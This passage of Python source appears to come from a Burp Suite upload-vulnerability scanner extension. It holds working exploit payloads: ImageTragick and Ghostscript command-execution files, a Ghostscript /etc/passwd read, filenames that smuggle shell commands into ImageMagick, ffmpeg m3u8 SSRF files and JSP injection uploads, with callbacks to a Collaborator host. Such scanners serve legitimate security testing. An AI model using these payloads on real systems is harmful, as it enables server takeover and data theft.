                print("\nDoing other SSRF checks")
                colab_tests.extend(self._ssrf(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
            # CSV/spreadsheet - generic
            if injector.opts.modules['csv_spreadsheet'].isSelected():
                print("\nDoing CSV/spreadsheet checks")
                colab_tests.extend(self._csv_spreadsheet(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
            # path traversal - generic
            if injector.opts.modules['path_traversal'].isSelected():
                print("\nDoing path traversal checks")
                self._path_traversal_archives(injector)
            # Polyglot - generic
            if injector.opts.modules['polyglot'].isSelected():
                print("\nDoing polyglot checks")
                colab_tests.extend(self._polyglot(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
            # Fingerping - generic
            if injector.opts.modules['fingerping'].isSelected():
                print("\nDoing fingerping checks")
                self._fingerping(injector)

            # TODO feature: "Analyzer module"
            # new module that uploads a png, a jpeg, a gif, etc. and checks in the downloaded
            # content which byte sequences of a certain length (eg. 6) survived transformation on the server
            # basically we could use something like python's SequenceMatcher to check where the files match...
            # Additionally, make the module analyze certain things such as "if we upload a PNG, is the
            # returned content-type in the redownloader a PNG?" with other types as well
            # What would also be a nice feature is to upload a PNG and download it again. Then use that PNG
            # as a starting point for attacks as we can be sure that is a valid one.

            # Upload quirks - generic
            if injector.opts.modules['quirks'].isSelected():
                print("\nDoing quirk checks")
                self._quirks_with_passive(injector)
                self._quirks_without_passive(injector)
            # Generic URL replacer module - obviously generic
            if injector.opts.modules['url_replacer'].isSelected():
                print("\nDoing generic URL replacement checks")
                colab_tests.extend(self._generic_url_replacer(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
            # Recursive uploader - generic
            if injector.opts.modules['recursive_uploader'].isSelected():
                print("\nDoing recursive upload checks")
                self._recursive_upload_files(injector, burp_colab)
            # Fuzz - generic
            if injector.opts.modules['fuzzer'].isSelected():
                print("\nDoing fuzzer checks")
                self._fuzz(injector)
        except StopScanException:
            scan_was_stopped = True

        # Just to make sure (maybe we write a new module above and forget this call):
        self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)

        # DoSing the server is best done at the end when we already know about everything else...
        # Timeout and DoS - generic
        if not scan_was_stopped:
            try:
                if injector.opts.modules['dos'].isSelected():
                    print("\nDoing timeout and DoS checks")
                    self._timeout_and_dos(injector)
            except StopScanException:
                pass
        if injector.opts.redl_enabled:
            injector.opts.scan_was_stopped()
        print("\nFinished")

    # Module functions
    def _sanity_check(self, injector):
        content = "eJzrDPBz5+WS4mJgYOD19HAJAtIrgXgmBxuQDFkv1cTAwFiT6ewc4OnsrBBQlJ+WmZPKwKAxMTkhQctTR+NEYmJCwomz2ppcRe" \
                  "VBHR09QQn7Dx84e+CwwpGEowrzZsTEPJAQeHC4Qbhm97EDHIv0Xzed8fr8p/Lysq01/8TM1s8sClO12vG1kbHcK6vQiJlZmX3C" \
                  "3DlBc+ZwpzxnuGl1ktVV1eEbj0L09j1LGI7YMaZ0izDKcqTcZ9x4WfENv0KZ0IyzR5jChIWe8KR4M9xk8hTYxtYxly8xuuHGSc" \
                  "lOTYdt7Cf0OqQPNFw+7HrwzoGg6xMbdnuy7bRcamDtsPDo5FniUjxF7AKnDSoMdhhoGMwwljCIMHphZDFtSdiUBhGr5+IhYqnL" \
                  "0qdoWDA5m4UetLTfvmCLylYP94PG+pH+7gdPHLjAsIRPJF1gsT17o2+6iHW/wOn4EwcSVp45cOBOs4D3rGMHNtTyMzcf0WyZcc" \
                  "qGja0um60t9zmXULfQQ770P8ecOuLnpOWwJH62MDTYcO/3//+bpZiZf6uwte0X/v///94X///v7278xvz4jQMfg0p55oOebCF+" \
                  "YDzMzQyJKInw9bFKzs/VS0zJT0rVq8gtYAABmworIDM3tSRRoSI3J6/YqsJWCazCCsgGCesrKYCVlGTbKkX4Big45xelKpjqme" \
                  "gZKNlxKSgo2BSlpFkFubhBtQN5tkoZJSUFVvr65eXleuXGevlF6fqGlpaW+gZG+kZGukAVusWVeSWJFbp5xcoQQ2DmuKQWJxdl" \
                  "FpRk5ucpgPiJSfmlJbZKSlA1EACxKLUiE2FTXjHUW0AP6oNk9A31DPThZoOMB4laBWRWpOZEuGTmpuYVA+2wMzSztNHHKoNVZy" \
                  "SSTlNjZJ2RGDpt9NE8BAktfWhw2XHZ6MOD3o7rEqOIDwMD02NPF8eQCsa3lw7yMijwHDFI+D+XO6nL5g6n38rve6L9Ggsahe+l" \
                  "zWLaz7BE4Qm3w6z6iY0TjCboM2T+c2VzOuWwj2HJT3FJDk3mn0wTnsWnKCzhGVU0qmiQKRJ/tZNVr/U4hzKo9PF09XNZ55TQBA" \
                  "B94FvQ".decode("base64").decode("zlib")
        types = [('', '.png', 'image/png')]
        self.sender.simple(injector, types, "SanityCheck", content, redownload=False, randomize=False)

    def _imagetragick_cve_2016_3718(self, injector, burp_colab):
        colab_tests = []
        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return colab_tests
        if injector.opts.file_formats['mvg'].isSelected():
            # burp collaborator based CVE-2016-3718
            basename = Constants.FILE_START + "Im18Colab"
            # tested to work on vulnerable ImageMagick:
            content_mvg = "push graphic-context\n" \
                          "viewbox 0 0 {} {}\n" \
                          "fill 'url({})'\n" \
                          "pop graphic-context".format(injector.opts.image_width, injector.opts.image_height, Constants.MARKER_COLLAB_URL)

            name = "Imagetragick CVE-2016-3718"
            severity = "Medium"
            confidence = "Certain"
            detail = "A Burp Colaborator interaction was detected when uploading an MVG imagetragick CVE-2016-3718 payload " \
                     "which contains a burp colaborator URL. This means that Server Side Request Forgery is possible. " \
                     "Check https://imagetragick.com/ for more details about CVE-2016-3718. Interactions for CVE-2016-3718:<br><br>"
            issue = self._create_issue_template(injector.get_brr(), name, detail, confidence, severity)
            colab_tests.extend(self._send_collaborator(injector, burp_colab, Constants.IM_MVG_TYPES, basename, content_mvg, issue))
        return colab_tests

    def _imagetragick_cve_2016_3714_sleep(self, injector):
        # time based (sleep) CVE-2016-3714
        name = "Imagetragick CVE-2016-3714 (sleep based)"
        severity = "High"
        confidence = "Certain"
        detail = "A timeout was reliably detected twice when uploading an {} image with an imagetragick payload that " \
                 "executes the {} command to delay the response delivery. Therefore arbitrary command execution seems possible. " \
                 "Check https://imagetragick.com/ for more details, also check for CVE-2016-3717 manually."
        svg = '<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" ' \
              '"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> <svg width="{}px" height="{}px" ' \
              'version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">' \
              '<image xlink:href="' + Constants.MARKER_CACHE_DEFEAT_URL + 'image.jpg`{} {}{}`" x="0" ' \
              'y="0" height="{}px" width="{}px"/></svg>'
        mvg = "push graphic-context\n" \
              "viewbox 0 0 {} {}\n" \
              "fill 'url(" + Constants.MARKER_CACHE_DEFEAT_URL + "\";{} {}\"{})'\n" \
              "pop graphic-context"
        filename = Constants.FILE_START + "ImDelay"

        for cmd_name, cmd, factor, args in self._get_sleep_commands(injector):
            if injector.opts.file_formats['mvg'].isSelected():
                issue = self._create_issue_template(injector.get_brr(), name, detail.format("MVG", cmd), confidence, severity)
                content_mvg = mvg.format(injector.opts.image_width, injector.opts.image_height, cmd, injector.opts.sleep_time * factor, args)
                self._send_sleep_based(injector, filename + "Mvg" + cmd_name, content_mvg, Constants.IM_MVG_TYPES, injector.opts.sleep_time, issue)
            if injector.opts.file_formats['svg'].isSelected():
                issue = self._create_issue_template(injector.get_brr(), name, detail.format("SVG", cmd), confidence, severity)
                content_svg = svg.format(injector.opts.image_width, injector.opts.image_height, cmd, injector.opts.sleep_time * factor, args, injector.opts.image_height, injector.opts.image_width)
                self._send_sleep_based(injector, filename + "Svg" + cmd_name, content_svg, Constants.IM_SVG_TYPES, injector.opts.sleep_time, issue)

        return []

    def _bad_manners_cve_2018_16323(self, injector):
        if not injector.opts.redl_enabled or not injector.opts.redl_configured:
            # this module can only find leaks in images when the files are downloaded again
            return
        # CVE-2018-16323, see https://github.com/ttffdd/XBadManners
        basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "BadManners"
        content = Xbm("".join(random.sample(string.ascii_letters, 5))).create_xbm(injector.opts.image_width,
                                   injector.opts.image_height)
        urrs = self.sender.simple(injector, Constants.XBM_TYPES, basename, content, redownload=True)
        for urr in urrs:
            if urr and urr.download_rr:
                resp = urr.download_rr.getResponse()
                if resp:
                    resp = FloydsHelpers.jb2ps(resp)
                    i_response_info = self._helpers.analyzeResponse(urr.download_rr.getResponse())
                    body_offset = i_response_info.getBodyOffset()
                    body = resp[body_offset:]
                    picture_width, picture_height, fileformat = ImageHelpers.image_width_height(body)
                    if picture_width and picture_height and fileformat:
                        has_been_resized = False
                        if picture_width >= 200 or picture_height >= 200:
                            # We first resize the picture to a small one so we don't have to check
                            # too many pixels (performance)...
                            thumbnail = ImageHelpers.rescale_image(200, 200, body)
                            if thumbnail:  # only if body was an image that ImageIO can parse
                                # Now get the pixels of the picture
                                body = thumbnail
                                has_been_resized = True
                                picture_width = 200
                                picture_height = 200
                        rgbs = ImageHelpers.get_image_rgb_list(body)
                        # As we send a first byte that is not white,
                        # let's ignore the first few pixels... (that's what a non-vulnerable imagemagick turns black)
                        for i in range(0, picture_width/4):
                            rgbs[i] = -1
                        body = ImageHelpers.get_image_from_rgb_list(picture_width, picture_height, fileformat, rgbs)
                        white = rgbs.count(-1)
                        # When doing "convert in.xbm out.png", the resulting PNG has only -16777216 as black...
                        black = 0
                        black_rgb_values = [-16777216]
                        # But with "convert in.xbm -size widthxheight out.jpeg", the resulting JPEG has as well others
                        # which are black pixels turned into gray values
                        # so this is not super accurate, but it doesn't matter too much, because the real false positive
                        # will be decided with is_grayscale
                        black_rgb_values.extend([-263173, -197380, -131587, -65794, -131587, -12434878, -657931,
                                                 -855310, -394759, -592138, -526345, -328966, -986896, -460552])
                        for value in black_rgb_values:
                            black += rgbs.count(value)
                        other = len(rgbs) - white - black
                        examples = [x for x in rgbs if x != -1 and x not in black_rgb_values]
                        other_examples = set(examples[:50])
                        if white < picture_width * picture_height:
                            # We uploaded a white picture, but we got something with not only white pixels
                            if ImageHelpers.is_grayscale(body):
                                # When it was resized, and it is only grayscale, then this could really be a true positive
                                # Black pixels often go gray when an image is resized (on the server side or here what we
                                # just did for performance reason) to a smaller size
                                name = "Bad Manners (CVE-2018-16323)"
                                severity = "High"
                                if other > 0:
                                    confidence = "Tentative"
                                else:
                                    confidence = "Firm"
                                detail = "The server might use a vulnerable version of Imagemagick. It is vulnerable to " \
                                     "CVE-2018-16323, see https://github.com/ttffdd/XBadManners. We uploaded a " \
                                     "fully white XBM file format picture (black and white format) with a known memory " \
                                     "disclosure payload and the server sent back an image that has not only white pixels. " \
                                     "This could also just mean that the server adds other colors to our picture, which is " \
                                     "countered by checking that the image is only grayscale. The image returned was only " \
                                     "grayscale. However, if the server modifies white picture to include gray or black " \
                                     "pixels this could still be a false positive. Please verify manually. <br>" \
                                     "Number of white pixels: {} <br>" \
                                     "Number of black/gray pixels (estimation): {} <br>" \
                                     "Number of other pixels (estimation): {} <br>" \
                                     "First 50 other pixel RGB integer values: <br>" \
                                     "{}".format(white, black, other, other_examples)
                                issue = self._create_issue_template(injector.get_brr(), name, detail, confidence, severity)
                                issue.httpMessagesPy = [urr.upload_rr, urr.download_rr]
                                self._add_scan_issue(issue)
                            #else:
                                #print("Although we uploaded a white XBM picture, the server returned a non-grayscale picture...")

    def _imagetragick_cve_2016_3714_rce(self, injector, burp_colab):
        colab_tests = []
        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return colab_tests

        # burp collaborator based CVE-2016-3714
        name = "Imagetragick CVE-2016-3714 (collaborator based)"
        severity = "High"
        confidence = "Certain"
        detail = "A Burp Colaborator interaction was detected when uploading a {} imagetragick CVE-2016-3714 payload " \
                 "which contains a burp colaborator payload as a {} command. Therefore arbitrary command execution seems possible. " \
                 "Check https://imagetragick.com/ for more details about CVE-2016-3714. Interactions for CVE-2016-3718:<br><br>"

        svg = '<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" ' \
              '"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> <svg width="{}px" height="{}px" ' \
              'version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">' \
              '<image xlink:href="' + Constants.MARKER_CACHE_DEFEAT_URL + 'image.jpg`{} {}`" x="0" ' \
              'y="0" height="{}px" width="{}px"/></svg>'
        mvg = "push graphic-context\n" \
              "viewbox 0 0 {} {}\n" \
              "fill 'url(" + Constants.MARKER_CACHE_DEFEAT_URL + "\";{} \"{})'\n" \
              "pop graphic-context"

        basename = Constants.FILE_START + "Im3714"

        for cmd_name, cmd, server, replace in self._get_rce_interaction_commands(injector, burp_colab):
            if injector.opts.file_formats['mvg'].isSelected():
                issue = self._create_issue_template(injector.get_brr(), name, detail.format("MVG", cmd), confidence, severity)
                content_mvg = mvg.format(injector.opts.image_width, injector.opts.image_height, cmd, server)
                colab_tests.extend(self._send_collaborator(injector, burp_colab, Constants.IM_MVG_TYPES, basename + "Mvg" + cmd_name,
                                                           content_mvg, issue, replace=replace))

            if injector.opts.file_formats['svg'].isSelected():
                issue = self._create_issue_template(injector.get_brr(), name, detail.format("SVG", cmd), confidence, severity)
                content_svg = svg.format(injector.opts.image_width, injector.opts.image_height, cmd, server,
                                         injector.opts.image_height, injector.opts.image_width)
                colab_tests.extend(self._send_collaborator(injector, burp_colab, Constants.IM_SVG_TYPES, basename + "Svg" + cmd_name,
                                                           content_svg, issue, replace=replace))

        return colab_tests

    def _magick(self, injector, burp_colab):
        colabs = []
        # burp collaborator based passing a filename starting with
        # pipe | makes Image-/GraphicsMagick execute to the -write command
        # As described on https://hackerone.com/reports/212696
        types = [('', Constants.MARKER_ORIG_EXT, '')]
        content = injector.get_uploaded_content()
        name = "Image-/GraphicsMagick filename RCE"
        severity = "High"
        confidence = "Certain"
        base_details = "The manual for GrapicksMagick on http://www.graphicsmagick.org/GraphicsMagick.html specifies: <br>" \
                       "-write &lt;filename&gt; <br>" \
                       "[...] <br>" \
                       "Precede the image file name with | to pipe to a system command. <br><br>" \
                       "Check https://hackerone.com/reports/212696 for more details. "
        detail_colab = "A Burp Colaborator interaction was detected when uploading a filename using a pipe character or similar " \
                        "which included a {} payload with a burp colaborator URL. This means that Remote Command Execution should be possible. " \
                        "The payload template was {} . Interactions:<br><br>"
        detail_sleep = "A delay in the response time was detected twice when uploading a filename using a pipe character or similar " \
                       "which included a {} payload. This means that Remote Command Execution should be possible. " \
                       "The payload template was {} . "

        # Sleep based
        for cmd_name, cmd, factor, args in self._get_sleep_commands(injector):
            basenames = [ "|{} {}{}|a".format(cmd, injector.opts.sleep_time * factor, args),
                          #"|{}%20{}{}|a".format(cmd.replace(" ", "%20"), injector.opts.sleep_time * factor, args.replace(" ", "%20")),
                          "|" + cmd.replace(" ", "${IFS}") + "${IFS}" + str(injector.opts.sleep_time * factor) + args.replace(" ", "%20") + "|a",
                          "1%20-write%20|{}%20{}{}|a".format(cmd.replace(" ", "%20"), injector.opts.sleep_time * factor, args.replace(" ", "%20")),
                          "1${IFS}-write${IFS}|" + cmd.replace(" ", "${IFS}") + "${IFS}" + str(injector.opts.sleep_time * factor) + args.replace(" ", "${IFS}") + "|a",
                          ]
            for basename in basenames:
                details = base_details + detail_sleep.format(cmd_name, basename)
                issue = self._create_issue_template(injector.get_brr(), name, details, confidence, severity)
                self._send_sleep_based(injector, basename, content, types, injector.opts.sleep_time, issue)

        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return colabs

        # Colab based
        for cmd_name, cmd, server, replace in self._get_rce_interaction_commands(injector, burp_colab):
            basenames = [ "|{} {}|a".format(cmd, server),
                          #"|{}%20{}|a".format(cmd.replace(" ", "%20"), server),
                          "|" + cmd.replace(" ", "${IFS}") + "${IFS}" + server + "|a",
                          "1%20-write%20|{}%20{}|a".format(cmd.replace(" ", "%20"), server),
                          "1${IFS}-write${IFS}|" + cmd + "${IFS}" + server + "|a",
                          ]
            for basename in basenames:
                details = base_details + detail_colab.format(cmd_name, basename)
                issue = self._create_issue_template(injector.get_brr(), name, details, confidence, severity)
                # print("Sending basename, replace", repr(basename), repr(replace))
                colabs.extend(self._send_collaborator(injector, burp_colab, types, basename, content, issue, replace=replace))

        return colabs

    def _ghostscript(self, injector, burp_colab):

        # CVE-2016-7977
        basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "GsLibPasswd"
        content = """%!PS
/Size 20 def                             % font/line size
/Line 0 def                              % current line
/Buf 1024 string def                     % line buffer
/Path 0 newpath def
>
/Courier-Bold findfont Size scalefont setfont
1 1 1 setrgbcolor clippath fill          % draw white background
0 0 0 setrgbcolor                        % set black foreground
>
(/etc/passwd) .libfile {
    {
        dup Buf readline
        {
            Path Line moveto show
        }{
            showpage
            quit
        } ifelse
        % next line
        /Line Line Size add def
    } loop
} if"""
        # As we do not want to regex search with a DownloadMatcher (too error prone), we only check if a ReDownloader
        # was configured and we know the response
        urrs = self.sender.simple(injector, Constants.GS_TYPES, basename, content, redownload=True)
        for urr in urrs:
            if urr and urr.download_rr:
                resp = urr.download_rr.getResponse()
                if resp:
                    resp =  FloydsHelpers.jb2ps(resp)
                    if Constants.REGEX_PASSWD.match(resp):
                        name = "Ghostscript Local File Include"
                        severity = "High"
                        confidence = "Firm"

                        detail = "A passwd-like response was downloaded when uploading a ghostscript file with a payload that " \
                                 "tries to include /etc/passwd. Therefore arbitrary file read seems possible. " \
                                 "See http://www.openwall.com/lists/oss-security/2016/09/30/8 for details. " \
                                 "Interactions: <br><br>"
                        issue = self._create_issue_template(injector.get_brr(), name + " CVE-2016-7977", detail, confidence, severity)
                        issue.httpMessagesPy = [urr.upload_rr, urr.download_rr]
                        self._add_scan_issue(issue)

        # CVE-2016-7976 with OutputICCProfile pipe technique
        # CVE-2017-8291 with OutputFile pipe technique
        # TODO feature: look at ghostbutt.com and metasploit implementation and see how they are doing it
        name = "Ghostscript RCE"
        severity = "High"
        confidence = "Certain"
        base_detail = "A ghostscript file with RCE payload was uploaded. See " \
                      "http://www.openwall.com/lists/oss-security/2016/09/30/8 and http://cve.circl.lu/cve/CVE-2017-8291 " \
                      "and http://openwall.com/lists/oss-security/2018/08/21/2 for details. "
        detail_sleep = "A delay was dectected twice when uploading a ghostscript file with a payload that " \
                       "executes a sleep like command. Therefore arbitrary command execution seems possible. " \
                       "The payload used the {} argument ({}) and the payload {}."
        detail_colab = "A burp collaborator interaction was dectected when uploading a ghostscript file with a payload that " \
                       "executes commands with a burp collaborator URL. Therefore arbitrary command execution seems possible. " \
                       "The payload used the {} argument ({}) and the payload {}. Interactions: <br><br>"
        basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "Gs"

        content_original_cve = "%!PS\n" \
                               "currentdevice null true mark /{} (%pipe%{} {} )\n" \
                               ".putdeviceparams\n" \
                               "quit"

        content_2 = "%!PS\n" \
                    "*legal*\n" \
                    "*{{ null restore }} stopped {{ pop }} if*\n" \
                    "*legal*\n" \
                    "*mark /{} (%pipe%{} {}) currentdevice putdeviceprops*\n" \
                    "*showpage*"

        content_ubuntu = "%!PS\n" \
                         "userdict /setpagedevice undef\n" \
                         "save\n" \
                         "legal\n" \
                         "{{ null restore }} stopped {{ pop }} if\n" \
                         "{{ legal }} stopped {{ pop }} if\n" \
                         "restore\n" \
                         "mark /{} (%pipe%{} {}) currentdevice putdeviceprops"

        content_centos = "%!PS\n" \
                         "userdict /setpagedevice undef\n" \
                         "legal\n" \
                         "{{ null restore }} stopped {{ pop }} if\n" \
                         "legal\n" \
                         "mark /{} (%pipe%{} {}) currentdevice putdeviceprops"

        techniques = (
            ("OutputFile", "CVE-2017-8291", content_original_cve),
            ("OutputICCProfile", "CVE-2016-7976", content_original_cve),

            ("OutputFile", "http://openwall.com/lists/oss-security/2018/08/21/2", content_2),
            #("OutputICCProfile", "http://openwall.com/lists/oss-security/2018/08/21/2", content_2),

            # OutputFile worked on a Linux minti 4.8.0-53-generic #56~16.04.1-Ubuntu SMP Tue May 16 01:18:56 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
            # With "identify" and "convert" from ImageMagick 6.8.9-9 Q16 x86_64 2017-03-14
            # But OutputICCProfile didn't:
            #   ./base/gsicc_manage.c:1088: gsicc_open_search(): Could not find %pipe%sleep 6.0
            # | ./base/gsicc_manage.c:1708: gsicc_set_device_profile(): cannot find device profile
            #   ./base/gsicc_manage.c:1088: gsicc_open_search(): Could not find %pipe%sleep 6.0
            # | ./base/gsicc_manage.c:1708: gsicc_set_device_profile(): cannot find device profile
            ("OutputFile", "http://openwall.com/lists/oss-security/2018/08/21/2", content_ubuntu),
            #("OutputICCProfile", "http://openwall.com/lists/oss-security/2018/08/21/2", content_ubuntu),

            ("OutputFile", "http://openwall.com/lists/oss-security/2018/08/21/2", content_centos),
            #("OutputICCProfile", "http://openwall.com/lists/oss-security/2018/08/21/2", content_centos),
        )

        # Sleep based
        for cmd_name, cmd, factor, args in self._get_sleep_commands(injector):
            for param, reference, content in techniques:
                details = base_detail + detail_sleep.format(param, reference, cmd)
                issue = self._create_issue_template(injector.get_brr(), name, details, confidence, severity)
                sleep_content = content.format(
                    #injector.opts.image_width,
                    #injector.opts.image_height,
                    param,
                    cmd,
                    str(injector.opts.sleep_time * factor) + args
                )
                self._send_sleep_based(injector, basename + cmd_name, sleep_content, Constants.GS_TYPES, injector.opts.sleep_time, issue)

        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return []
        colab_tests = []

        # Colab based
        for cmd_name, cmd, server, replace in self._get_rce_interaction_commands(injector, burp_colab):
            for param, reference, content in techniques:
                details = base_detail + detail_colab.format(param, reference, cmd)
                issue = self._create_issue_template(injector.get_brr(), name, details, confidence, severity)
                attack = content.format(
                    #injector.opts.image_width,
                    #injector.opts.image_height,
                    param,
                    cmd,
                    server
                )
                colab_tests.extend(self._send_collaborator(injector, burp_colab, Constants.GS_TYPES, basename + param + cmd_name,
                                                           attack, issue, replace=replace, redownload=True))

        return colab_tests

    def _libavformat(self, injector, burp_colab):
        # TODO: Implement .qlt files maybe? https://www.gnucitizen.org/blog/backdooring-mp3-files/
        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return []

        # burp collaborator based as described on https://hackerone.com/reports/115857
        basename = Constants.FILE_START + "AvColab"
        content_m3u8 = "#EXTM3U\r\n#EXT-X-MEDIA-SEQUENCE:0\r\n#EXTINF:10.0,\r\n{}example.mp4\r\n##prevent cache: {}\r\n#EXT-X-ENDLIST".format(Constants.MARKER_COLLAB_URL, str(random.random()))

        name = "LibAvFormat SSRF"
        severity = "High"
        confidence = "Certain"
        detail = "A Burp Colaborator interaction was detected when uploading an libavformat m3u8 payload " \
                 "which contains a burp colaborator URL. This means that Server Side Request Forgery is possible. " \
                 "Check https://hackerone.com/reports/115857 for more details. Also check manually if the website is not vulnerable to " \
                 "local file include. Interactions:<br><br>"
        issue = self._create_issue_template(injector.get_brr(), name, detail, confidence, severity)

        colabs = self._send_collaborator(injector, burp_colab, Constants.AV_TYPES,
                                       basename + "M3u", content_m3u8, issue)

        # avi file with m3u as described on https://hackerone.com/reports/226756
        # https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/edit#slide=id.g2239eb85ba_0_20
        # and https://github.com/neex/ffmpeg-avi-m3u-xbin
        avi_generator = AviM3uXbin()

        name = "LibAvFormat SSRF"
        severity = "High"
        confidence = "Certain"
        detail = "A Burp Colaborator interaction was detected when uploading an libavformat m3u8 payload inside an AVI file " \
                 "which contains a burp colaborator URL. This means that Server Side Request Forgery is possible. " \
                 "Check https://hackerone.com/reports/226756 and https://github.com/neex/ffmpeg-avi-m3u-xbin for more details. " \
                 "Usually this means it is vulnerable to local file inclusion. Interactions:<br><br>"
        issue = self._create_issue_template(injector.get_brr(), name, detail, confidence, severity)

        #Yes this looks weird here that we pass content_m3u8, but that's correct
        colabs2 = self._send_collaborator(injector, burp_colab, Constants.AV_TYPES,
                                         basename + "AviM3u", content_m3u8, issue, replace=avi_generator.get_avi_file)

        colabs.extend(colabs2)
        return colabs

    def _jsp_rce_params(self, extension, mime, content=""):
        lang = "JSP"
        if mime:
            types = {
                ('', Constants.MARKER_ORIG_EXT, ''),
                ('', '.jsp' + Constants.MARKER_ORIG_EXT, ''),
                # ('', '.jsp' + self._marker_orig_ext, mime),
                # ('', '.jsp' + extension, ''),
                ('', '.jsp' + extension, mime),
                ('', '.jsp\x00' + extension, mime),
                ('', '.jsp%00' + extension, mime),
                ('', '.jsp', ''),
                ('', '.jsp', mime),
            }
        else:
            mime = "application/x-jsp"
            types = {
                ('', Constants.MARKER_ORIG_EXT, ''),
                ('', '.jsp' + Constants.MARKER_ORIG_EXT, ''),
                ('', '.jsp\x00' + Constants.MARKER_ORIG_EXT, ''),
                ('', '.jsp%00' + Constants.MARKER_ORIG_EXT, ''),
                # ('', '.jsp\x00' + self._marker_orig_ext, mime),
                # ('', '.jsp%00' + self._marker_orig_ext, mime),
                ('', '.jsp', ''),
                ('', '.jsp', mime),
            }
        return lang, types, content

    def _jspx_rce_params(self, extension, mime, content=""):
        lang = "JSPX"
        if mime:
            types = {
                ('', Constants.MARKER_ORIG_EXT, ''),
                ('', '.jspx' + Constants.MARKER_ORIG_EXT, ''),
                # ('', '.jspx' + self._marker_orig_ext, mime),
                # ('', '.jspx.'+ extension, ''),
                ('', '.jspx' + extension, mime),
                ('', '.jspx\x00' + extension, mime),
                ('', '.jspx%00' + extension, mime),
                ('', '.jspx', ''),
                ('', '.jspx', mime),
            }
        else:
            mime = "application/x-jsp"
            types = {
                ('', Constants.MARKER_ORIG_EXT, ''),
                ('', '.jspx' + Constants.MARKER_ORIG_EXT, ''),
                ('', '.jspx\x00' + Constants.MARKER_ORIG_EXT, ''),
                ('', '.jspx%00' + Constants.MARKER_ORIG_EXT, ''),
                # ('', '.jspx\x00' + self._marker_orig_ext, mime),
                # ('', '.jspx%00' + self._marker_orig_ext, mime),
                ('', '.jspx', ''),
                ('', '.jspx', mime),
            }
        return lang, types, content

    def _jsp_gen_payload_expression_lang(self):
        # these numbers are arbitrary but make sure we don't get an int overflow...
        a = random.randint(3, 134)
        b = random.randint(3, 8456)
        c = random.randint(3, 7597)
        d = random.randint(3, 65123)
        e = random.randint(1000000000000000, 2115454131589564)
        payload = "${" + str(a) + " * " + str(b) + "+" + str(c) + "+" + str(d) + "+" + str(e) + "}"
        # make sure the payload has always the same length
        desired_length = 60
        payload = (desired_length - len(payload)) * " " + payload
        expect = str(a * b + c + d + e)
        return payload, expect

    def _jsp_gen_payload_tags(self):
        r = ''.join(random.sample(string.ascii_letters, 5))
        payload = '<% System.out.println("InJ" + "eCt"+"TeSt-' + r + '"); %>'
        expect = 'InJeCtTeSt-' + r
        return payload, expect

    def _jspx_gen_payload(self):
        """Actually this is JSPX with JSP 2.0"""
        one = ''.join(random.sample(string.ascii_letters, 8))
        two = ''.join(random.sample(string.ascii_letters, 8))
        three = ''.join(random.sample(string.ascii_letters, 8))
        payload = '''<tags:xhtmlbasic xmlns:tags="urn:jsptagdir:/WEB-INF/tags"
                 xmlns:jsp="http://java.sun.com/JSP/Page"
                 xmlns:fmt="http://java.sun.com/jsp/jstl/fmt"
                 xmlns="http://www.w3.org/1999/xhtml">
                  <jsp:directive.page contentType="text/html" />
                  <head>
                    <title>JSPX</title>
                  </head>
                  <body>
                    <c:set var="three" value='${"''' + three + '''"}'/>
                    <c:set var="one" value='${"''' + one + '''"}'/>
                    <c:set var="two" value='${"''' + two + '''"}'/>
                    <text>${one}${two}${three}</text>
                  </body>
                </tags:xhtmlbasic>'''
        expect = one + two + three
        return payload, expect

    def _jsp_rce(self, injector):
        # automated approach with BackdooredFile class
        # sadly, the only two types that produce valid JSP files that can be detected by this plugin are GIF and PDF
        # with all others the JSP files starts with high byte values or the JSP parser throws another exception. For example:
        # org.apache.jasper.JasperException: java.lang.ClassNotFoundException: org.apache.jsp.uploads._1DownloadMeMetamakernotesJSP3_jsp
        # org.apache.jasper.servlet.JspServletWrapper.getServlet(JspServletWrapper.java:177)
        # org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:369)
        # org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:390)
        # org.apache.jasper.servlet.JspServlet.service(JspServlet.java:334)
        # javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
        # or
        # org.apache.jasper.JasperException: Unable to compile class for JSP
        # org.apache.jasper.JspCompilationContext.compile(JspCompilationContext.java:661)
        # org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:357)
        # org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:390)
        # org.apache.jasper.servlet.JspServlet.service(JspServlet.java:334)
        # javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
        # while that can be interesting too, it doesn't justify to send all kind of formats that only produce errors
        # therefore we send only GIF and PDF, as well as JPEG to trigger the error case (JPEG is probably the most popular format)
        # As JPEG and PNG both start with non-ascii, this is probably not possible. But let me know if you figure it out :)
        # But on the other hand we have different injection possibilities:
        # Expression Language with ${}
        # Old school tags <%  %>
        # TODO feature: Let me know if I'm wrong and there are installations which work fine with such files

        non_working_formats = {".png", ".tiff"}
        used_formats = set(BackdooredFile.EXTENSION_TO_MIME.keys()) - non_working_formats
